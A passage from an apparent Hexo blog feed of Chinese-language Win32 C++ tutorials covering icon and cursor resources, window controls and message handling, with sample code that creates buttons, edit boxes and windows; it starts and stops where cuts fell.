href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-makeintresourcea">MAKEINTRESOURCE</a>宏创建此值。</p><p><strong>返回值</strong></p><p>类型：<strong>HICON</strong></p><p>如果函数成功，则返回值是新加载图标的句柄。</p><p>如果函数失败，则返回值为<strong>NULL</strong>。要获取扩展错误信息，请调用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a>。</p><p><strong>备注</strong></p><p><strong>LoadIcon</strong>仅在未加载的情况下加载图标资源；否则，它检索现有资源的句柄。该函数在图标资源中搜索最适合当前显示的图标。图标资源可以是彩色或单色位图。</p><p><strong>LoadIcon</strong>只能加载其大小符合一个图标<strong>SM_CXICON</strong>和<strong>SM_CYICON</strong>系统指标值。使用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-loadimagea">LoadImage</a>函数加载其他尺寸的图标。</p></blockquote><p><strong>LoadIcon第二个参数可以在头文件里面看见</strong></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/6.png" alt="6"></p><blockquote><p>但是光直接写还不行 还是会报错 因为图片ID 实际上的值是整形的 而IDI_ICON1 是LPCWSTR形的  所以需要强转</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/7.png" alt="7"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/8.png" alt="8"></p><blockquote><p>可以用F12查看一下MAKEINTRESOURCE</p></blockquote><blockquote><p>相当于这个宏的作用也是进行强转</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/9.png" alt="9"></p><blockquote><p>这样写也是可以的</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/10.png" alt="10"></p><blockquote><p>然后设置图标</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/11.png" alt="11"></p><blockquote><p>试验一下</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/12.png" alt="12"></p><blockquote><p>成功变化</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/13.png" alt="13"></p><blockquote><p>也可以在创建的时候直接改变图标的样子</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/14.png" alt="14"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/15.png" alt="15"></p><h2 id="设置鼠标样式"><a href="#设置鼠标样式" class="headerlink" title="设置鼠标样式"></a>设置鼠标样式</h2><blockquote><p>先导入一个鼠标的光标资源</p></blockquote><blockquote><p>操作和上面一样</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/16.png" alt="16"></p><blockquote><p>然后保存</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/17.png" alt="17"></p><blockquote><p>方式也都和上面的基本类似只是函数改了一下</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/18.png" alt="18"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/19.png" alt="19"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/20.png" alt="20"></p><blockquote><p>同样也可以创建窗口的时候就改变鼠标</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/21.png" alt="21"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;resource.h&quot;</span></span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-keyword">static</span> HINSTANCE hInstance = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-comment">//MessageBoxW(hwnd, L&quot;窗口创建了&quot;, L&quot;提示&quot;, MB_OK);</span><br><span class="hljs-comment">//添加控件</span><br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;移动窗口&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x100</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;获取文本框内容&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">60</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x101</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置文本框内容&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">110</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x102</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置父窗口&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">160</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x103</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_EDIT, <span class="hljs-string">L&quot;文本框内容&quot;</span>, WS_CHILD | WS_BORDER | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">320</span>, <span class="hljs-number">320</span>, <span class="hljs-number">80</span>, hwnd, (HMENU)<span class="hljs-number">0x104</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置ICON&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">220</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x105</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置鼠标&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">420</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x106</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_COMMAND:<br>&#123;<br>WORD ControlId = <span class="hljs-built_in">LOWORD</span>(wParam);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ControlId)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x100</span>:<br>&#123;<br>RECT rect&#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">GetClientRect</span>(hwnd, &amp;rect);<br><span class="hljs-keyword">int</span> x = <span class="hljs-built_in">rand</span>() % (rect.right - <span class="hljs-number">120</span>);<br><span class="hljs-keyword">int</span> y = <span class="hljs-built_in">rand</span>() % (rect.bottom - <span class="hljs-number">40</span>);<br><span class="hljs-built_in">MoveWindow</span>((HWND)lParam, x, y, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, TRUE);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x101</span>:<br>&#123;<br>WCHAR buff[<span class="hljs-number">100</span>]&#123; <span class="hljs-number">0</span> &#125;;<br>HWND hedit = <span class="hljs-built_in">GetDlgItem</span>(hwnd, <span class="hljs-number">0x104</span>);<br><span class="hljs-built_in">GetWindowTextW</span>(hedit, buff, <span class="hljs-number">100</span>);<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, buff, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x102</span>:<br>&#123;<br><span class="hljs-comment">/*HWND hedit = GetDlgItem(hwnd, 0x104);</span><br><span class="hljs-comment">SetWindowTextW(hedit,0x104,L&quot;SetWindowTextW&quot;);*/</span><br><span class="hljs-built_in">SetDlgItemTextW</span>(hwnd, <span class="hljs-number">0x104</span>, <span class="hljs-string">L&quot;SetDlgItemTextW&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x103</span>:<br>&#123;<br>HWND hnote = <span class="hljs-built_in">FindWindowW</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;无标题 - 记事本&quot;</span>);<br><span class="hljs-built_in">SetParent</span>((HWND)lParam, hnote);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x105</span>:<br>&#123;<br><span class="hljs-comment">//LPCWSTR</span><br><span class="hljs-comment">//MAKEINTRESOURCE</span><br><span class="hljs-comment">//LoadIcon(hInstance, (LPCWSTR)IDI_ICON1);</span><br>HICON hicon=<span class="hljs-built_in">LoadIcon</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDI_ICON1));<br><span class="hljs-built_in">SetClassLongW</span>(hwnd,GCL_HICON,(LONG)hicon);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x106</span>:<br>&#123;<br><br>HCURSOR hcursor = <span class="hljs-built_in">LoadCursorW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDC_CURSOR1));<br><span class="hljs-built_in">SetClassLongW</span>(hwnd, GCL_HCURSOR, (LONG)hcursor);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd, uMsg, wParam, lParam);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPreInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR lpCmdeLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nCmdShow</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//1.创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br>myClass.hbrBackground = <span class="hljs-built_in">CreateSolidBrush</span>(<span class="hljs-built_in">RGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>));<br><span class="hljs-comment">//myClass.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));//设置图标</span><br>myClass.hCursor= <span class="hljs-built_in">LoadCursorW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDC_CURSOR1));<br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br>HWND hwindow = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwindow, SW_SHOWNORMAL);<br><br><span class="hljs-comment">//5.获取消息</span><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-built_in">DispatchMessageW</span>(&amp;msg);<span class="hljs-comment">//分发消息给消息处理函数</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows窗口控件</title>
    <link href="/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/"/>
    <url>/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/2.png" alt="2"></p><p><img src="/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/3.png" alt="3"></p><p><img src="/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/4.png" alt="4"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-keyword">static</span> HINSTANCE hInstance = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-comment">//MessageBoxW(hwnd, L&quot;窗口创建了&quot;, L&quot;提示&quot;, MB_OK);</span><br><span class="hljs-comment">//添加控件</span><br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;按钮1&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">100</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x100</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd, uMsg, wParam, lParam);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPreInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR lpCmdeLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nCmdShow</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//1.创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br>HWND hwindow = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwindow, SW_SHOWNORMAL);<br><br><span class="hljs-comment">//5.获取消息</span><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-built_in">DispatchMessageW</span>(&amp;msg);<span class="hljs-comment">//分发消息给消息处理函数</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows编程消息处理</title>
    <link href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/"/>
    <url>/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/1.png" alt="1"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/2.png" alt="2"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/3.png" alt="3"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/4.png" alt="4"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">const</span> UINT WM_USERMSG = WM_USER + <span class="hljs-number">1</span>;   <span class="hljs-comment">//自定义消息事件</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">(LPCWSTR format, ...)</span> </span>&#123;<br>WCHAR wchar_buff[<span class="hljs-number">100</span>]&#123; <span class="hljs-number">0</span> &#125;;<br>va_list arglist;<br><span class="hljs-built_in">va_start</span>(arglist, format);<br><span class="hljs-built_in">wvsprintfW</span>(wchar_buff, format, arglist);<br><span class="hljs-built_in">va_end</span>(arglist);<br><span class="hljs-built_in">OutputDebugStringW</span>(wchar_buff);<br><br>&#125;<br><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> 